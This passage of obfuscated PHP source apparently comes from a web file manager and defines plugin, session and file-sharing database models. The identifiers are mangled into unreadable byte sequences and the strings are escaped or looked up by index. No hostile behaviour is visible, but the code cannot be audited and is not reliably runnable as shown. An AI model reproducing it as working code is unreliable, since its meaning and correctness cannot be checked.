Hook::trigger($‹À­„ï[2007]); $Ÿ‹ÔĞö³ = $this->loadPluginList(); foreach ($Ÿ‹ÔĞö³ as $‰‰¯ÀüÍ => $É­—åİ) { $²¯ƒ†Ğ  = $this->appAllow($‰‰¯ÀüÍ, $É­—åİ); if (!$²¯ƒ†Ğ ) { continue; } foreach ($É­—åİ[$‹À­„ï[2008]] as $œ˜ØßäŒ => $¤†˜Ë») { Hook::bind($œ˜ØßäŒ, $¤†˜Ë»); } } Hook::trigger($‹À­„ï[2009]); Hook::trigger(ACTION); } public function appAllow($¤‡®¾™Ÿ, $ŒØ¾¯ø”, $»’ÄÓæ¦ = true) { $œÃôÅâ =& $_SERVER[ ÇƒŠìÀ]; $¦¿şïÈÓ = PLUGIN_DIR . $¤‡®¾™Ÿ . $œÃôÅâ[2010]; if (!is_array($ŒØ¾¯ø”) || !is_array($ŒØ¾¯ø”[$œÃôÅâ[2008]]) || $ŒØ¾¯ø”[$œÃôÅâ[779]] != 1 || !is_file($¦¿şïÈÓ)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$œÃôÅâ[6]][$œÃôÅâ[2011]] || !$GLOBALS[$œÃôÅâ[6]][$œÃôÅâ[2012]]) { return !0; } $òËà£Åß = explode($œÃôÅâ[50], strtolower($GLOBALS[$œÃôÅâ[6]][$œÃôÅâ[2012]])); return in_array(strtolower($¤‡®¾™Ÿ), $òËà£Åß) ? !1 : !0; } if ($»’ÄÓæ¦ && !Action($œÃôÅâ[2013])->checkAuth($¤‡®¾™Ÿ)) { return !1; } return !0; } public function unInstall($ãˆŠÖüŒ) { $©ñ¡ú¤‚ =& $_SERVER[ ÇƒŠìÀ]; $³‡®‘´ = $this->loadList($ãˆŠÖüŒ); if (file_exists(PLUGIN_DIR . $ãˆŠÖüŒ)) { Hook::apply($ãˆŠÖüŒ . $©ñ¡ú¤‚[2014]); } $this->remove($³‡®‘´[$©ñ¡ú¤‚[445]]); } public function changeStatus($íµûíÆ‡, $ãå…¼›) { $³’ô¦·¹ =& $_SERVER[ ÇƒŠìÀ]; $õ¡ïï¦ = $this->loadList($íµûíÆ‡); if ($ãå…¼›) { Hook::apply($íµûíÆ‡ . $³’ô¦·¹[2015]); } $this->update($õ¡ïï¦[$³’ô¦·¹[445]], array($³’ô¦·¹[2016] => $ãå…¼›)); } public function appRegist($•÷åØŸÏ, $Ü Èöî¯) { $åôÊÁš =& $_SERVER[ ÇƒŠìÀ]; $ú—•¬şƒ = $this->loadList($•÷åØŸÏ); if ($ú—•¬şƒ) { $this->update($ú—•¬şƒ[$åôÊÁš[445]], array($åôÊÁš[2008] => $Ü Èöî¯)); } else { $¨‚üï› = array($åôÊÁš[32] => $•÷åØŸÏ, $åôÊÁš[2008] => $Ü Èöî¯, $åôÊÁš[779] => 0, $åôÊÁš[6] => $this->getConfigDefault($•÷åØŸÏ)); $this->insert($¨‚üï›); } } public function getConfigDefault($½¡ˆ¾½˜) { $ëâúŠèÎ =& $_SERVER[ ÇƒŠìÀ]; $¤¿ÀÔ¹Ë = array(); $‘äû¼Ÿ¦ = $this->getPackageJson($½¡ˆ¾½˜); if (!$‘äû¼Ÿ¦ && is_array($‘äû¼Ÿ¦[$ëâúŠèÎ[2017]])) { return $¤¿ÀÔ¹Ë; } foreach ($‘äû¼Ÿ¦[$ëâúŠèÎ[2017]] as $íå»Ã¨ú => $¢ÍŠ¥Õ) { if (!isset($¢ÍŠ¥Õ[$ëâúŠèÎ[420]]) || isset($¤¿ÀÔ¹Ë[$íå»Ã¨ú])) { continue; } $¤¿ÀÔ¹Ë[$íå»Ã¨ú] = $¢ÍŠ¥Õ[$ëâúŠèÎ[420]]; } return $¤¿ÀÔ¹Ë; } public function getPackageJson($™òÁ’±) { return Hook::apply($™òÁ’± . $_SERVER[ ÇƒŠìÀ][2018]); } public function getConfig($ÁòëÃ©Œ, $¶ô ÔÂ¬ = false) { $¯‰Æİ¼™ =& $_SERVER[ ÇƒŠìÀ]; $ˆÙ²—Æá = array(); $¾¨ûÓÇ = $this->loadList($ÁòëÃ©Œ); if ($¾¨ûÓÇ && is_array($¾¨ûÓÇ[$¯‰Æİ¼™[6]])) { $ˆÙ²—Æá = $¾¨ûÓÇ[$¯‰Æİ¼™[6]]; } if (!$ˆÙ²—Æá || $¶ô ÔÂ¬) { $ˆÙ²—Æá = $this->getConfigDefault($ÁòëÃ©Œ); } return $ˆÙ²—Æá; } public function setConfig($êˆÛøÌ¡, $ŠêÏğŞ® = false) { $Ú¾šÓ =& $_SERVER[ ÇƒŠìÀ]; $ ¿§ïÏ‡ = $this->loadList($êˆÛøÌ¡); if (!$ ¿§ïÏ‡) { return !1; } $ƒ¡ÙŞ¹Ä = $ ¿§ïÏ‡[$Ú¾šÓ[6]]; if ($ŠêÏğŞ® == !1) { $ƒ¡ÙŞ¹Ä = array(); $ŠêÏğŞ® = $this->getConfigDefault($êˆÛøÌ¡); } foreach ($ŠêÏğŞ® as $ô´Šº™Ã => $’Â”ÜÜ…) { $ƒ¡ÙŞ¹Ä[$ô´Šº™Ã] = is_string($’Â”ÜÜ…) ? trim($’Â”ÜÜ…) : $’Â”ÜÜ…; } $this->update($ ¿§ïÏ‡[$Ú¾šÓ[445]], array($Ú¾šÓ[6] => $ƒ¡ÙŞ¹Ä)); } public function viewList() { $…ŠüúîÓ =& $_SERVER[ ÇƒŠìÀ]; $âÌ©åâœ = $this->loadList(); $this->pluginScan($âÌ©åâœ); $âÌ©åâœ = $this->loadPluginList(); $éÈ²ã” = array(); foreach ($âÌ©åâœ as $ÔïˆÊ› => $æâË¡»Ü) { $ûÚ±Î‰ = $æâË¡»Ü; unset($æâË¡»Ü[$…ŠüúîÓ[2008]], $æâË¡»Ü[$…ŠüúîÓ[6]]); $ãäßİôÒ = PLUGIN_DIR . $æâË¡»Ü[$…ŠüúîÓ[32]] . $…ŠüúîÓ[2010]; if (!is_file($ãäßİôÒ)) { continue; } $ÂÛÔÌ«± = Hook::apply($æâË¡»Ü[$…ŠüúîÓ[32]] . $…ŠüúîÓ[2018]); if (!is_array($ÂÛÔÌ«±)) { continue; } $éÈ²ã”[$ÔïˆÊ›] = array_merge($æâË¡»Ü, $ÂÛÔÌ«±); if ($ûÚ±Î‰[$…ŠüúîÓ[6]][$…ŠüúîÓ[1604]] != $ÂÛÔÌ«±[$…ŠüúîÓ[1578]]) { Hook::apply($æâË¡»Ü[$…ŠüúîÓ[32]] . $…ŠüúîÓ[2015]); $ûÚ±Î‰[$…ŠüúîÓ[6]][$…ŠüúîÓ[1604]] = $ÂÛÔÌ«±[$…ŠüúîÓ[1578]]; $this->update($æâË¡»Ü[$…ŠüúîÓ[445]], array($…ŠüúîÓ[6] => $ûÚ±Î‰[$…ŠüúîÓ[6]])); } } return $éÈ²ã”; } private function loadPluginList() { $¼İä†ª¬ =& $_SERVER[ ÇƒŠìÀ]; $íîÖàî = $this->loadList(); if (strtolower(MOD) == $¼İä†ª¬[2019]) { return $íîÖàî; } $Èóæ¯éã = Hook::trigger($¼İä†ª¬[2020], $íîÖàî); if ($íîÖàî && !$Èóæ¯éã) { die; } return $Èóæ¯éã ? $Èóæ¯éã : $íîÖàî; } private function pluginScan($ÆªùÑğ¼) { $ª­¢š˜Â =& $_SERVER[ ÇƒŠìÀ]; recursion_dir(PLUGIN_DIR, $ß÷×¦­¯, $şÅÙˆ­ó, 0); foreach ($ß÷×¦­¯ as $İ…Àƒïç) { $ì£ıñÄÑ = get_path_this($İ…Àƒïç); if (isset($ÆªùÑğ¼[$ì£ıñÄÑ]) || !file_exists($İ…Àƒïç . $ª­¢š˜Â[2021]) || !file_exists($İ…Àƒïç . $ª­¢š˜Â[2010])) { continue; } Hook::apply($ì£ıñÄÑ . $ª­¢š˜Â[2015]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\x79\163\164\145\x6d\137\163\145\x73\163\151\157\x6e"; public function get($¸­ğ †¤) { $¨Ö»ãœ¿ =& $_SERVER[ ÇƒŠìÀ]; $•ÙòÃ¿Œ = $this->where(array($¨Ö»ãœ¿[2022] => $¸­ğ †¤))->find(); if (!is_array($•ÙòÃ¿Œ)) { return !1; } return $•ÙòÃ¿Œ[$¨Ö»ãœ¿[783]]; } public function set($ßÈ‡²…›, $úê½¿É, $™°â¹Ô = 3600) { $Êõ¥¡à =& $_SERVER[ ÇƒŠìÀ]; $İô€Ä·° = array($Êõ¥¡à[2022] => $ßÈ‡²…›, $Êõ¥¡à[1926] => $úê½¿É, $Êõ¥¡à[2023] => $™°â¹Ô + time()); if (Session::get($Êõ¥¡à[2024])) { $İô€Ä·°[$Êõ¥¡à[1689]] = Session::get($Êõ¥¡à[2024]); } else { $İô€Ä·°[$Êõ¥¡à[1689]] = 0; } if ($this->get($ßÈ‡²…›)) { return $this->where(array($Êõ¥¡à[2022] => $ßÈ‡²…›))->save($İô€Ä·°); } else { return $this->add($İô€Ä·°, array(), !0); } } public function remove($éëíÒ¸Ø) { return $this->where(array($_SERVER[ ÇƒŠìÀ][2022] => $éëíÒ¸Ø))->delete(); } public function clearTimeout() { return $this->where($_SERVER[ ÇƒŠìÀ][2025] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\x68\141\162\145"; protected $dataAuto = array(array("\x6d\157\x64\x69\146\x79\124\151\x6d\x65", "\164\x69\155\145", "\151\156\x73\x65\162\x74\54\165\x70\144\x61\164\x65", "\x66\x75\x6e\x63\x74\x69\157\156"), array("\x63\162\145\x61\164\x65\x54\x69\155\145", "\x74\151\x6d\145", "\x69\156\163\x65\x72\x74", "\x66\x75\156\143\164\x69\157\156"), array("\x6f\x70\x74\x69\x6f\156\163", '', "\x69\156\163\x65\162\164\x2c\x75\160\x64\141\x74\x65\54\x73\x65\x6c\145\x63\x74", "\152\163\x6f\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($¾€‚ ¿) { $ÎáÅêùæ =& $_SERVER[ ÇƒŠìÀ]; $å‹ÒÛòî = isset($¾€‚ ¿[0]) ? $¾€‚ ¿[0] : !1; return array($ÎáÅêùæ[2026] => array(USER_ID, $ÎáÅêùæ[2027]), $ÎáÅêùæ[1967] => array($å‹ÒÛòî, $ÎáÅêùæ[2028])); } protected function listSimple() { $ãëÏ±½Á = array($_SERVER[ ÇƒŠìÀ][1689] => USER_ID); $¹¶–ã®ú = $this->field($this->fieldList)->where($ãëÏ±½Á)->select(); return $¹¶–ã®ú ? $¹¶–ã®ú : array(); } protected function getInfo($î˜ûÈåİ, $ı®ğµ® = false) { $Â€÷Ã€ =& $_SERVER[ ÇƒŠìÀ]; if ($ı®ğµ®) { return $this->_getShareInfo(array($Â€÷Ã€[635] => $î˜ûÈåİ)); } $éŸøÒŞ¿ = $this->cacheFunctionGet($Â€÷Ã€[1969], $î˜ûÈåİ); return $éŸøÒŞ¿; } public function getInfoByHash($¸Ÿ§»í÷) { return $this->_getShareInfo(array($_SERVER[ ÇƒŠìÀ][2029] => $¸Ÿ§»í÷)); } public function getInfoByPath($¦½±İØ) { $Ú—÷– =& $_SERVER[ ÇƒŠìÀ]; $ì¸ÑÉí– = array($Ú—÷–[1689] => USER_ID, $Ú—÷–[183] => $¦½±İØ); return $this->_getShareInfo($ì¸ÑÉí–); } public function getInfoBySourcePath($ëı÷–¿ê) { $™ôİû¿ü =& $_SERVER[ ÇƒŠìÀ]; $Ç¾»Êë» = array($™ôİû¿ü[1689] => USER_ID, $™ôİû¿ü[1210] => $ëı÷–¿ê); return $this->_getShareInfo($Ç¾»Êë»); } private function _getShareInfo($«™¡Ï‡Í) { $Õ¿ ¿¥¹ =& $_SERVER[ ÇƒŠìÀ]; $“¬†­í‰ = $this->where($«™¡Ï‡Í)->find(); if (!$“¬†­í‰) { return !1; } $«™¡Ï‡Í = array($Õ¿ ¿¥¹[635] => $“¬†­í‰[$Õ¿ ¿¥¹[635]]); $ğÁÛçÜ± = $Õ¿ ¿¥¹[2030]; $•ñğÉà¸ = Model($Õ¿ ¿¥¹[636])->order($Õ¿ ¿¥¹[445])->field($ğÁÛçÜ±)->where($«™¡Ï‡Í)->select(); if ($“¬†­í‰[$Õ¿ ¿¥¹[183]] == $Õ¿ ¿¥¹[214]) { $“¬†­í‰[$Õ¿ ¿¥¹[89]] = IO::info($“¬†­í‰[$Õ¿ ¿¥¹[1210]]); } else { $“¬†­í‰[$Õ¿ ¿¥¹[89]] = Model($Õ¿ ¿¥¹[1368])->pathInfo($“¬†­í‰[$Õ¿ ¿¥¹[183]]); } $“¬†­í‰[$Õ¿ ¿¥¹[2031]] = $•ñğÉà¸; return $“¬†­í‰; } protected function getInfoAuth($‹±à·¸) { $ÕçÇÒ½ƒ =& $_SERVER[ ÇƒŠìÀ]; $¨¬«¬ê = $this->getInfo($‹±à·¸); if ($¨¬«¬ê[$ÕçÇÒ½ƒ[1689]] == USER_ID) { $¨¬«¬ê[$ÕçÇÒ½ƒ[457]] = $¨¬«¬ê[$ÕçÇÒ½ƒ[89]][$ÕçÇÒ½ƒ[457]]; } else { $¨¬«¬ê[$ÕçÇÒ½ƒ[457]] = Model($ÕçÇÒ½ƒ[538])->authMake($¨¬«¬ê[$ÕçÇÒ½ƒ[2031]]); } return $¨¬«¬ê; } protected function listData($ùÌ¼á”“ = null, $í±Îş³Ã = 300) { $ùË•ëä³ =& $_SERVER[ ÇƒŠìÀ]; $Œ¦«…Ì = array(array($ùË•ëä³[533] => array($ùË•ëä³[1047], 0), $ùË•ëä³[633] => array($ùË•ëä³[1047], 0), $ùË•ëä³[2032] => $ùË•ëä³[1985])); if ($ùÌ¼á”“ == $ùË•ëä³[2033]) { $Œ¦«…Ì = array($ùË•ëä³[533] => 1); } else { if ($ùÌ¼á”“ == $ùË•ëä³[1196]) { $Œ¦«…Ì = array($ùË•ëä³[633] => 1); } } $Œ¦«…Ì[$ùË•ëä³[1689]] = USER_ID; $Î‹ô¥´Â = $this->where($Œ¦«…Ì)->selectPage($í±Îş³Ã); return $Î‹ô¥´Â; } protected function listToMe($ØÎ†É‚ = 300) { $‹ª¾ÔÔ³ =& $_SERVER[ ÇƒŠìÀ]; $êÒÒÌ£Í = Model($‹ª¾ÔÔ³[2034])->userGroupParents(USER_ID); $áºò¢—È = array($‹ª¾ÔÔ³[618] => SourceModel::TYPE_USER, $‹ª¾ÔÔ³[540] => USER_ID); if ($êÒÒÌ£Í) { $áºò¢—È = array(array($‹ª¾ÔÔ³[618] => SourceModel::TYPE_USER, $‹ª¾ÔÔ³[540] => USER_ID), array($‹ª¾ÔÔ³[618] => SourceModel::TYPE_GROUP, $‹ª¾ÔÔ³[540] => array($‹ª¾ÔÔ³[7], $êÒÒÌ£Í)), $‹ª¾ÔÔ³[2032] => $‹ª¾ÔÔ³[1985]); } $¦¡¹ÁŒÂ = Model($‹ª¾ÔÔ³[636])->where($áºò¢—È)->selectPage($ØÎ†É‚); $‡±ı“ì = array_to_keyvalue_group($¦¡¹ÁŒÂ[$‹ª¾ÔÔ³[415]], $‹ª¾ÔÔ³[635]); if (!$‡±ı“ì) { return $¦¡¹ÁŒÂ; } $æ¨ÇÖ®ó = $‹ª¾ÔÔ³[2035]; $áºò¢—È = array($‹ª¾ÔÔ³[635] => array($‹ª¾ÔÔ³[462], array_keys($‡±ı“ì)), $‹ª¾ÔÔ³[1689] => array($‹ª¾ÔÔ³[1049], $‹ª¾ÔÔ³[214])); $í÷­£Áñ = $this->field($æ¨ÇÖ®ó)->where($áºò¢—È)->select(); foreach ($í÷­£Áñ as $ïÁß€ => &$×—ß¸²è) { $×—ß¸²è[$‹ª¾ÔÔ³[2031]] = $‡±ı“ì[$×—ß¸²è[$‹ª¾ÔÔ³[635]]]; } unset($×—ß¸²è); $ãòÏ±î” = array($‹ª¾ÔÔ³[2036] => $í÷­£Áñ, $‹ª¾ÔÔ³[2037] => $¦¡¹ÁŒÂ[$‹ª¾ÔÔ³[412]]); return $ãòÏ±î”; } protected function shareAdd($§ÑÛè¦ª, $ƒå¼ÂÀø) { $ïØô¾òí =& $_SERVER[ ÇƒŠìÀ]; $ã³Ï“ùÃ = $this->_addShareData($§ÑÛè¦ª, $ƒå¼ÂÀø); if (!empty($ƒå¼ÂÀø[$ïØô¾òí[2038]])) { $this->_shareAuthSet($ã³Ï“ùÃ, $ƒå¼ÂÀø[$ïØô¾òí[2038]]); } $this->shareEventAdd($§ÑÛè¦ª, $ƒå¼ÂÀø, $ïØô¾òí[2039]); return $ã³Ï“ùÃ; } protected function shareAddSystem($¦¥¨”Í®, $ë®ì²Ç) { $ê‡ÊÌ¨ =& $_SERVER[ ÇƒŠìÀ]; $¦´Êší² = $this->_addShareData($¦¥¨”Í®, $ë®ì²Ç, $ê‡ÊÌ¨[181]); $this->_shareAuthSet($¦´Êší², $ë®ì²Ç[$ê‡ÊÌ¨[2038]]); return $¦´Êší²; } private function shareEventAdd($ÑäòùçŠ, $Ú¥íµ¶°, $²€Š³ó„ = "\141\144\x64") { $’ÏîõÀ =& $_SERVER[ ÇƒŠìÀ]; if (!$ÑäòùçŠ || $ÑäòùçŠ == $’ÏîõÀ[214]) { return; } if ($²€Š³ó„ == $’ÏîõÀ[2039]) { if ($Ú¥íµ¶°[$’ÏîõÀ[533]] == $’ÏîõÀ[90]) { Model($’ÏîõÀ[603])->eventShare($ÑäòùçŠ, $’ÏîõÀ[2040]); } if ($Ú¥íµ¶°[$’ÏîõÀ[633]] == $’ÏîõÀ[90]) { Model($’ÏîõÀ[603])->eventShare($ÑäòùçŠ, $’ÏîõÀ[2041]); } return; } $Îº˜ìş“ = $this->getInfoByPath($ÑäòùçŠ); $‚µ¨ìÍó = $’ÏîõÀ[2042]; if ($Îº˜ìş“[$’ÏîõÀ[533]] == $’ÏîõÀ[214] && $Ú¥íµ¶°[$’ÏîõÀ[533]] == $’ÏîõÀ[90]) { $‚µ¨ìÍó = $’ÏîõÀ[2040]; } if ($Îº˜ìş“[$’ÏîõÀ[533]] == $’ÏîõÀ[90] && $Ú¥íµ¶°[$’ÏîõÀ[533]] == $’ÏîõÀ[214]) { $‚µ¨ìÍó = $’ÏîõÀ[2043]; } if ($Îº˜ìş“[$’ÏîõÀ[633]] == $’ÏîõÀ[214] && $Ú¥íµ¶°[$’ÏîõÀ[633]] == $’ÏîõÀ[90]) { $‚µ¨ìÍó = $’ÏîõÀ[2041]; } if ($Îº˜ìş“[$’ÏîõÀ[633]] == $’ÏîõÀ[90] && $Ú¥íµ¶°[$’ÏîõÀ[633]] == $’ÏîõÀ[214]) { $‚µ¨ìÍó = $’ÏîõÀ[2044]; } Model($’ÏîõÀ[603])->eventShare($ÑäòùçŠ, $‚µ¨ìÍó); return; } private function _addShareData($§ÓøÓ, $ŠûıÉ“ê = array(), $æÈíÔÖ = false) { $’…ÅØ« =& $_SERVER[ ÇƒŠìÀ]; $‰µÀ¡¸ = $æÈíÔÖ == $’…ÅØ«[181] ? 0 : USER_ID; $ÜŠâ•ö‰ = array($’…ÅØ«[461] => $§ÓøÓ, $’…ÅØ«[1680] => $‰µÀ¡¸); if ($§ÓøÓ == 0) { $ÜŠâ•ö‰ = array($’…ÅØ«[2045] => $ŠûıÉ“ê[$’…ÅØ«[1210]], $’…ÅØ«[1680] => $‰µÀ¡¸); } if ($†‹ú«Ã¤ = $this->where($ÜŠâ•ö‰)->find()) { return $†‹ú«Ã¤[$’…ÅØ«[635]]; } if ($§ÓøÓ == 0) { $‹öš­â¬ = array($’…ÅØ«[32] => get_path_this($ŠûıÉ“ê[$’…ÅØ«[86]])); } else { $‹öš­â¬ = Model($’…ÅØ«[854])->sourceInfo($§ÓøÓ); if (!$‹öš­â¬) { return !1; } } if (!$ŠûıÉ“ê[$’…ÅØ«[1579]]) { $ŠûıÉ“ê[$’…ÅØ«[1579]] = $‹öš­â¬[$’…ÅØ«[32]]; } $¨ŠÙËÊ = array($’…ÅØ«[1680] => $‰µÀ¡¸, $’…ÅØ«[461] => $§ÓøÓ, $’…ÅØ«[1579] => $’…ÅØ«[12], $’…ÅØ«[533] => 0, $’…ÅØ«[633] => 0, $’…ÅØ«[1210] => $’…ÅØ«[12], $’…ÅØ«[353] => $’…ÅØ«[12], $’…ÅØ«[922] => $’…ÅØ«[12], $’…ÅØ«[2046] => 0, $’…ÅØ«[2047] => 0, $’…ÅØ«[790] => 0, $’…ÅØ«[2048] => $’…ÅØ«[12], $’…ÅØ«[2029] => $’…ÅØ«[12]); $èì‡­¥ğ = explode($’…ÅØ«[50], $’…ÅØ«[2049]); foreach ($èì‡­¥ğ as $ñ•«ôÂ”) { if (!isset($ŠûıÉ“ê[$ñ•«ôÂ”])) { continue; } $¨ŠÙËÊ[$ñ•«ôÂ”] = $ŠûıÉ“ê[$ñ•«ôÂ”]; } $¦×ÓÇ€± = $this->add($¨ŠÙËÊ); $•·­®ÙŞ = array($’…ÅØ«[2029] => short_id($¦×ÓÇ€±)); $this->where(array($’…ÅØ«[2050] => $¦×ÓÇ€±))->save($•·­®ÙŞ); return $¦×ÓÇ€±; } private function _shareAuthSet($Ê†ÙĞ¤ç, $º§ú¡ï×) { $¿û¼âÃÚ =& $_SERVER[ ÇƒŠìÀ]; if (!is_array($º§ú¡ï×)) { return !1; } $¢¤µİ € = Model($¿û¼âÃÚ[1995]); $¢¤µİ €->where(array($¿û¼âÃÚ[635] => $Ê†ÙĞ¤ç))->delete(); $µ¢ŠÁ« = array(); foreach ($º§ú¡ï× as $èÕäÓÉ”) { $Éñ§¬íÍ = SourceModel::TYPE_USER; if ($èÕäÓÉ”[$¿û¼âÃÚ[180]] == SourceModel::TYPE_GROUP) { $Éñ§¬íÍ = SourceModel::TYPE_GROUP; } $¾Û¬ÑÅÄ = array($¿û¼âÃÚ[635] => $Ê†ÙĞ¤ç, $¿û¼âÃÚ[180] => $Éñ§¬íÍ, $¿û¼âÃÚ[540] => intval($èÕäÓÉ”[$¿û¼âÃÚ[540]]), $¿û¼âÃÚ[1991] => 0, $¿û¼âÃÚ[2051] => -1); if ($èÕäÓÉ”[$¿û¼âÃÚ[1991]]) { $¾Û¬ÑÅÄ[$¿û¼âÃÚ[1991]] = $èÕäÓÉ”[$¿û¼âÃÚ[1991]]; } else { if ($èÕäÓÉ”[$¿û¼âÃÚ[2051]]) { $¾Û¬ÑÅÄ[$¿û¼âÃÚ[2051]] = $èÕäÓÉ”[$¿û¼âÃÚ[2051]]; } } $µ¢ŠÁ«[] = $¾Û¬ÑÅÄ; } return $¢¤µİ €->addAll($µ¢ŠÁ«, array(), !0); } public function numViewAdd($‰—Åª™©) { $ğâ‚ĞÜ¥ =& $_SERVER[ ÇƒŠìÀ]; $á™°©à = array($ğâ‚ĞÜ¥[2050] => $‰—Åª™©); $this->where($á™°©à)->setAdd($ğâ‚ĞÜ¥[2046]); } public function numDownloadAdd($Äß’‘±é) { $¥¬¶ò—â =& $_SERVER[ ÇƒŠìÀ]; $°ò™Öé = array($¥¬¶ò—â[2050] => $Äß’‘±é); $this->where($°ò™Öé)->setAdd($¥¬¶ò—â[2047]); } protected function shareEdit($‚ó¨Ã¤«, $ã¾ÓÛš§) { $«âµ¥Şº =& $_SERVER[ ÇƒŠìÀ]; $ÏªÆ»¬Ö = $this->getInfo($‚ó¨Ã¤«); if (!$ÏªÆ»¬Ö) { return !1; } $this->_checkLinkShare($ã¾ÓÛš§, $ÏªÆ»¬Ö); $à¿Ğ³× = array(); $‹­å®ª = explode($«âµ¥Şº[50], $«âµ¥Şº[2052]); foreach ($‹­å®ª as $»ÖŞ“üã) { if (!array_key_exists($»ÖŞ“üã, $ã¾ÓÛš§)) { continue; } $à¿Ğ³×[$»ÖŞ“üã] = $ã¾ÓÛš§[$»ÖŞ“üã]; } $this->shareEventAdd($ÏªÆ»¬Ö[$«âµ¥Şº[183]], $ã¾ÓÛš§, $«âµ¥Şº[1857]); $this->where(array($«âµ¥Şº[2050] => $‚ó¨Ã¤«))->save($à¿Ğ³×); if (isset($ã¾ÓÛš§[$«âµ¥Şº[2038]])) { $this->_shareAuthSet($‚ó¨Ã¤«, $ã¾ÓÛš§[$«âµ¥Şº[2038]]); } return !0; } private function _checkLinkShare($µ–’ş‘¶, $¡²²‘ ) { $¤è‡ç‹‡ =& $_SERVER[ ÇƒŠìÀ]; if ($µ–’ş‘¶[$¤è‡ç‹‡[533]] != $¤è‡ç‹‡[90]) { return; } $÷ÂÙŞñ« = $¡²²‘ [$¤è‡ç‹‡[89]][$¤è‡ç‹‡[183]]; if ($¡²²‘ [$¤è‡ç‹‡[89]][$¤è‡ç‹‡[33]] != $¤è‡ç‹‡[216]) { $¾è€ú×° = $this->_folderReport($÷ÂÙŞñ«); if (!$¾è€ú×°) { return; } show_json(LNG($¤è‡ç‹‡[2053]) . $¤è‡ç‹‡[2054] . $¾è€ú×°, !1); } $‡ˆ‡½½‘ = Model($¤è‡ç‹‡[854])->fileInfoGet($¡²²‘ [$¤è‡ç‹‡[89]][$¤è‡ç‹‡[183]]); if (!$‡ˆ‡½½‘) { return; } $ÙúÓüˆ = $this->shareFileMeta($‡ˆ‡½½‘[$¤è‡ç‹‡[511]]); if (isset($ÙúÓüˆ[$¤è‡ç‹‡[420]]) && $ÙúÓüˆ[$¤è‡ç‹‡[420]] == $¤è‡ç‹‡[90]) { show_json(LNG($¤è‡ç‹‡[2055]), !1); } } private function _folderReport($ä…õÆ¤à) { $…·é—Ó¤ =& $_SERVER[ ÇƒŠìÀ]; $Şîê¬†‹ = array($…·é—Ó¤[511] => array($…·é—Ó¤[1047], 0), $…·é—Ó¤[779] => 3); $¨´à€ÜÓ = Model($…·é—Ó¤[2056])->where($Şîê¬†‹)->field($…·é—Ó¤[511])->select(); if (!$¨´à€ÜÓ) { return !1; } $¨´à€ÜÓ = array_to_keyvalue($¨´à€ÜÓ, $…·é—Ó¤[12], $…·é—Ó¤[511]); $ƒªÎ¬³® = $…·é—Ó¤[50] . $ä…õÆ¤à . $…·é—Ó¤[50]; $Şîê¬†‹ = array($…·é—Ó¤[511] => array($…·é—Ó¤[7], $¨´à€ÜÓ), $…·é—Ó¤[555] => array($…·é—Ó¤[429], "\45{$ƒªÎ¬³®}\x25"), $…·é—Ó¤[475] => 0); $äÊ›€â› = Model($…·é—Ó¤[854])->where($Şîê¬†‹)->field($…·é—Ó¤[2057])->find(); if (!$äÊ›€â›) { return !1; } $¡á¢ÁË´ = substr($äÊ›€â›[$…·é—Ó¤[555]], strpos($äÊ›€â›[$…·é—Ó¤[555]], $ƒªÎ¬³®)); $Şîê¬†‹ = array($…·é—Ó¤[183] => array($…·é—Ó¤[7], trim($¡á¢ÁË´, $…·é—Ó¤[50]))); $Ş¶‘‘˜Š = Model($…·é—Ó¤[854])->where($Şîê¬†‹)->field($…·é—Ó¤[32])->select(); $ÙÅËÃË« = array_to_keyvalue($Ş¶‘‘˜Š, $…·é—Ó¤[12], $…·é—Ó¤[32]); $ÙÅËÃË«[] = $äÊ›€â›[$…·é—Ó¤[32]]; return implode($…·é—Ó¤[8], $ÙÅËÃË«); } protected function remove($¦åä˜ŸÔ) { $±Íä¡­Ò =& $_SERVER[ ÇƒŠìÀ]; if (is_array($¦åä˜ŸÔ)) { $¦åä˜ŸÔ = array($±Íä¡­Ò[7], $¦åä˜ŸÔ); } $—¬ ¯øí = array($±Íä¡­Ò[635] => $¦åä˜ŸÔ); $Ï¡ŒÂùÜ = $this->where($—¬ ¯øí)->delete(); if ($Ï¡ŒÂùÜ) { Model($±Íä¡­Ò[636])->where(array($±Íä¡­Ò[635] => $¦åä˜ŸÔ))->delete(); } $ùÎŒò¶ë = is_array($¦åä˜ŸÔ) ? $¦åä˜ŸÔ[1] : array($¦åä˜ŸÔ); for ($Î±Ğãüµ = 0; $Î±Ğãüµ < count($ùÎŒò¶ë); $Î±Ğãüµ++) { $á‰®×™ù = $this->getInfo($ùÎŒò¶ë[$Î±Ğãüµ]); if ($á‰®×™ù[$±Íä¡­Ò[633]] == $±Íä¡­Ò[90]) { Model($±Íä¡­Ò[603])->eventShare($á‰®×™ù[$±Íä¡­Ò[183]], $±Íä¡­Ò[2044]); } if ($á‰®×™ù[$±Íä¡­Ò[533]] == $±Íä¡­Ò[90]) { Model($±Íä¡­Ò[603])->eventShare($á‰®×™ù[$±Íä¡­Ò[183]], $±Íä¡­Ò[2043]); } } return $Ï¡ŒÂùÜ; } protected function removeBySource($¤¦Çñ§ı) { $¾ ¬¶Ä =& $_SERVER[ ÇƒŠìÀ]; $˜ëúœƒÇ = array($¾ ¬¶Ä[461] => array($¾ ¬¶Ä[462], $¤¦Çñ§ı)); $åº†ÙÛ = $this->field($¾ ¬¶Ä[635])->where($˜ëúœƒÇ)->select(); $åº†ÙÛ = array_to_keyvalue($åº†ÙÛ, $¾ ¬¶Ä[12], $¾ ¬¶Ä[635]); if (!$åº†ÙÛ) { return; } $˜ëúœƒÇ = array($¾ ¬¶Ä[2050] => array($¾ ¬¶Ä[462], $åº†ÙÛ)); $this->where($˜ëúœƒÇ)->delete(); Model($¾ ¬¶Ä[636])->where($˜ëúœƒÇ)->delete(); } public function listAll($ÒŞè°Û) { $ºø°¤Æ =& $_SERVER[ ÇƒŠìÀ]; $ïÜí’ı = array(); if ($ÒŞè°Û[$ºø°¤Æ[1689]]) { $ïÜí’ı[$ºø°¤Æ[1689]] = $ÒŞè°Û[$ºø°¤Æ[1689]]; } if ($ÒŞè°Û[$ºø°¤Æ[789]]) { $½ğ¡™ƒ« = $ÒŞè°Û[$ºø°¤Æ[790]] ? $ÒŞè°Û[$ºø°¤Æ[790]] : strtotime(date($ºø°¤Æ[2058])); $ïÜí’ı[$ºø°¤Æ[217]] = array($ºø°¤Æ[379], array($ÒŞè°Û[$ºø°¤Æ[789]], $½ğ¡™ƒ«)); } if 